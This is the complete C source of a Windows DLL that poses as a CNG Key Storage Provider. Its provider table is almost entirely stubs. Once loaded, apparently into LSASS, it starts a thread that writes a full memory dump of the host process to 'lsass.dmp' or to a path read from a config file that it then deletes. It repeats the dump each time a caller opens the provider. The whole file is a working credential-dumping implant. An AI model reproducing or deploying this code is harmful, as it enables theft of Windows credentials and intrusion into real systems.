#define WIN32_LEAN_AND_MEAN
#define _WIN32_WINNT 0x0A00
#include <windows.h>

#define CFG_LEAF     L"dump_path.cfg"
#define DUMP_LEAF    L"lsass.dmp"
#define STATUS_EXT   L".status"
#define MAX_PATH_W   1024
#define MAX_CFG_WCHARS 1000

#define MINIDUMP_WITH_FULL_MEMORY 0x00000002

typedef BOOL (WINAPI *minidump_write_dump_fn)(HANDLE hProcess,
                                              DWORD process_id,
                                              HANDLE hfile,
                                              DWORD dump_type,
                                              void *exception_param,
                                              void *user_stream_param,
                                              void *callback_param);

typedef long (__stdcall *nte_slot_fn)(void);

typedef struct {
    unsigned long dwVersion;
    long (__stdcall *OpenProvider)(void **, const wchar_t *, unsigned long);
    nte_slot_fn OpenKey;
    nte_slot_fn CreatePersistedKey;
    nte_slot_fn GetProviderProperty;
    nte_slot_fn GetKeyProperty;
    nte_slot_fn SetProviderProperty;
    nte_slot_fn SetKeyProperty;
    nte_slot_fn FinalizeKey;
    nte_slot_fn DeleteKey;
    long (__stdcall *FreeProvider)(void *);
    long (__stdcall *FreeKey)(void *);
    long (__stdcall *FreeBuffer)(void *);
    nte_slot_fn EnumKeys;
    nte_slot_fn ImportKey;
    nte_slot_fn ExportKey;
    nte_slot_fn SignHash;
    nte_slot_fn VerifySignature;
    nte_slot_fn Decrypt;
    nte_slot_fn Encrypt;
    nte_slot_fn AssembleEccPublicKey;
    nte_slot_fn DeriveKey;
} ksp_table_t;

#define KSP_NTE_STUB 0x80090029L

static long __stdcall stub_nte(void) { return KSP_NTE_STUB; }

static long __stdcall ok_free(void *h)
{
    (void)h;
    return 0;
}

static HANDLE volatile g_dump_event;
static volatile LONG g_busy = 1;

static void kick_worker(void)
{
    if (InterlockedCompareExchange(&g_busy, 1, 0) == 0) {
        HANDLE ev = g_dump_event;
        if (!ev || !SetEvent(ev))
            InterlockedExchange(&g_busy, 0);
    }
}

static long __stdcall ksp_open_provider(void **ph, const wchar_t *name,
                                        unsigned long flags)
{
    (void)name;
    (void)flags;
    kick_worker();
    if (ph)
        *ph = (void *)0x44440001;
    return 0;
}

static const ksp_table_t g_ksp_table = {
    1,
    ksp_open_provider,
    stub_nte, stub_nte, stub_nte, stub_nte,
    stub_nte, stub_nte, stub_nte, stub_nte,
    ok_free, ok_free, ok_free,
    stub_nte, stub_nte, stub_nte, stub_nte, stub_nte,
    stub_nte, stub_nte, stub_nte, stub_nte,
};

__declspec(dllexport)
long __stdcall GetKeyStorageInterface(const wchar_t *name, void **pp,
                                      unsigned long flags)
{
    (void)name;
    (void)flags;
    if (!pp)
        return (long)0x80090027;
    *pp = (void *)&g_ksp_table;
    return 0;
}

static DWORD wlen(const wchar_t *s)
{
    DWORD n = 0;
    while (s && s[n])
        n++;
    return n;
}

static void wcopy(wchar_t *dst, const wchar_t *src, DWORD n)
{
    DWORD i;
    for (i = 0; i < n; i++)
        dst[i] = src[i];
}

static void append_w(wchar_t *dst, DWORD cap, const wchar_t *src)
{
    DWORD base = wlen(dst);
    DWORD n = wlen(src);
    DWORD i;

    if (base >= cap)
        return;
    if (n > cap - base - 1)
        n = cap - base - 1;
    for (i = 0; i < n; i++)
        dst[base + i] = src[i];
    dst[base + n] = 0;
}

static int join_path(wchar_t *dst, DWORD cap, const wchar_t *dir,
                     const wchar_t *leaf)
{
    if (wlen(dir) + wlen(leaf) + 1 >= cap)
        return 0;
    dst[0] = 0;
    append_w(dst, cap, dir);
    append_w(dst, cap, leaf);
    return 1;
}

static void append_decimal(char *dst, DWORD cap, unsigned long long v)
{
    char tmp[24];
    int n = 0;
    DWORD base = 0;

    while (dst[base])
        base++;
    if (v == 0)
        tmp[n++] = '0';
    while (v && n < (int)sizeof(tmp)) {
        tmp[n++] = (char)('0' + (v % 10));
        v /= 10;
    }
    while (n-- > 0 && base + 1 < cap)
        dst[base++] = tmp[n];
    dst[base] = 0;
}

static void status_path_for(const wchar_t *dump_path, wchar_t *outp, DWORD cap)
{
    DWORD n = wlen(dump_path);
    DWORD i;

    if (n > cap - wlen(STATUS_EXT) - 2)
        n = cap - wlen(STATUS_EXT) - 2;
    for (i = 0; i < n; i++)
        outp[i] = dump_path[i];
    outp[n] = 0;
    append_w(outp, cap, STATUS_EXT);
}

static void write_status(const wchar_t *dump_path, const char *text)
{
    wchar_t path[MAX_PATH_W + 16];
    HANDLE f;
    DWORD written = 0;

    if (!dump_path || !dump_path[0])
        return;
    status_path_for(dump_path, path, MAX_PATH_W + 16);
    f = CreateFileW(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                    FILE_ATTRIBUTE_NORMAL, NULL);
    if (f == INVALID_HANDLE_VALUE)
        return;
    {
        DWORD n = 0;
        while (text[n])
            n++;
        WriteFile(f, text, n, &written, NULL);
    }
    CloseHandle(f);
}

static void report_ok(const wchar_t *dump_path, unsigned long long bytes)
{
    char line[64];
    DWORD i;

    const char *pre = "OK ";
    for (i = 0; pre[i]; i++)
        line[i] = pre[i];
    line[i] = 0;
    append_decimal(line, sizeof(line), bytes);
    write_status(dump_path, line);
}

static void report_err(const wchar_t *dump_path, const char *stage,
                       DWORD err)
{
    char line[96];
    DWORD i, base = 0;

    const char *pre = "ERR ";
    for (i = 0; pre[i]; i++)
        line[base++] = pre[i];
    for (i = 0; stage[i] && base < sizeof(line) - 1; i++)
        line[base++] = stage[i];
    line[base++] = ' ';
    line[base] = 0;
    append_decimal(line, sizeof(line), (unsigned long long)err);
    write_status(dump_path, line);
}

static int get_own_dir(wchar_t *dir, DWORD cap)
{
    HMODULE self;
    wchar_t buf[MAX_PATH_W];
    DWORD n;
    LONG i;

    if (!GetModuleHandleExW(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS |
                            GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT,
                            (LPCWSTR)&get_own_dir, &self))
        return 0;
    n = GetModuleFileNameW(self, buf, MAX_PATH_W);
    if (n == 0 || n >= MAX_PATH_W)
        return 0;
    for (i = (LONG)n - 1; i > 0; i--) {
        if (buf[i] == L'\\' || buf[i] == L'/')
            break;
    }
    if (i <= 0)
        return 0;
    if ((DWORD)i + 2 >= cap)
        return 0;
    wcopy(dir, buf, (DWORD)i + 1);
    dir[i + 1] = 0;
    return 1;
}

static int read_cfg(const wchar_t *dir, wchar_t *outp, DWORD cap)
{
    wchar_t path[MAX_PATH_W];
    HANDLE f;
    BYTE raw[MAX_CFG_WCHARS * 2 + 2];
    DWORD readn = 0, size, wchars, i;

    if (!join_path(path, MAX_PATH_W, dir, CFG_LEAF))
        return 0;
    f = CreateFileW(path, GENERIC_READ,
                    FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                    NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (f == INVALID_HANDLE_VALUE)
        return 0;
    size = GetFileSize(f, NULL);
    if (size == INVALID_FILE_SIZE || size == 0 ||
        size > MAX_CFG_WCHARS * 2 || (size & 1)) {
        CloseHandle(f);
        return 0;
    }
    if (!ReadFile(f, raw, size, &readn, NULL) || readn != size) {
        CloseHandle(f);
        return 0;
    }
    CloseHandle(f);

    wchars = size / 2;
    if (((wchar_t *)raw)[0] == 0xFEFF) {
        wcopy((wchar_t *)raw, (wchar_t *)raw + 1, wchars - 1);
        wchars--;
    }
    if (wchars == 0 || wchars >= cap)
        return 0;
    ((wchar_t *)raw)[wchars] = 0;

    while (wchars > 0) {
        wchar_t c = ((wchar_t *)raw)[wchars - 1];
        if (c == L'\r' || c == L'\n' || c == L' ' || c == L'\t')
            ((wchar_t *)raw)[--wchars] = 0;
        else
            break;
    }
    if (wchars == 0)
        return 0;
    for (i = 0; i <= wchars; i++)
        outp[i] = ((wchar_t *)raw)[i];

    DeleteFileW(path);
    return 1;
}

static void do_dump(void)
{
    wchar_t dir[MAX_PATH_W];
    wchar_t dump[MAX_PATH_W + 16];
    wchar_t status_path[MAX_PATH_W + 32];
    HANDLE file, dbg;
    minidump_write_dump_fn fn;
    LARGE_INTEGER size;
    DWORD err;
    BOOL ok;

    if (!get_own_dir(dir, MAX_PATH_W))
        return;

    if (!read_cfg(dir, dump, MAX_PATH_W + 16) &&
        !join_path(dump, MAX_PATH_W + 16, dir, DUMP_LEAF)) {
        write_status(L"lsass.dmp", "ERR pathlen 0");
        return;
    }

    status_path_for(dump, status_path, MAX_PATH_W + 32);
    DeleteFileW(status_path);

    file = CreateFileW(dump, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
                       FILE_ATTRIBUTE_NORMAL, NULL);
    if (file == INVALID_HANDLE_VALUE) {
        report_err(dump, "createdump", GetLastError());
        return;
    }

    dbg = LoadLibraryW(L"dbghelp.dll");
    if (!dbg) {
        err = GetLastError();
        CloseHandle(file);
        report_err(dump, "dbghelp", err);
        return;
    }
    fn = (minidump_write_dump_fn)(void *)GetProcAddress(dbg, "MiniDumpWriteDump");
    if (!fn) {
        err = GetLastError();
        FreeLibrary(dbg);
        CloseHandle(file);
        report_err(dump, "apifetch", err);
        return;
    }

    ok = fn(GetCurrentProcess(), GetCurrentProcessId(), file,
            MINIDUMP_WITH_FULL_MEMORY, NULL, NULL, NULL);
    if (!ok) {
        err = GetLastError();
        FreeLibrary(dbg);
        CloseHandle(file);
        report_err(dump, "minidump", err);
        return;
    }
    FlushFileBuffers(file);
    ok = GetFileSizeEx(file, &size);
    err = GetLastError();
    FreeLibrary(dbg);
    CloseHandle(file);
    if (!ok || size.QuadPart <= 0) {
        report_err(dump, "size", err ? err : 0);
        return;
    }
    report_ok(dump, (unsigned long long)size.QuadPart);
}

static DWORD WINAPI cng_worker(void *unused)
{
    HANDLE ev;

    (void)unused;
    ev = CreateEventW(NULL, FALSE, FALSE, NULL);
    if (!ev)
        return 0;

    g_dump_event = ev;
    MemoryBarrier();

    do_dump();
    InterlockedExchange(&g_busy, 0);

    for (;;) {
        WaitForSingleObject(ev, INFINITE);
        do_dump();
        InterlockedExchange(&g_busy, 0);
    }
}

static HMODULE g_pin;

BOOL WINAPI DllMain(HINSTANCE inst, DWORD reason, LPVOID reserved)
{
    (void)reserved;
    if (reason == DLL_PROCESS_ATTACH) {
        wchar_t self[MAX_PATH_W];

        DisableThreadLibraryCalls(inst);

        g_pin = (HMODULE)inst;
        if (GetModuleFileNameW(inst, self, MAX_PATH_W))
            g_pin = LoadLibraryW(self);

        if (CreateThread(NULL, 0, cng_worker, NULL, 0, NULL) == NULL)
            return TRUE;
    }
    return TRUE;
}
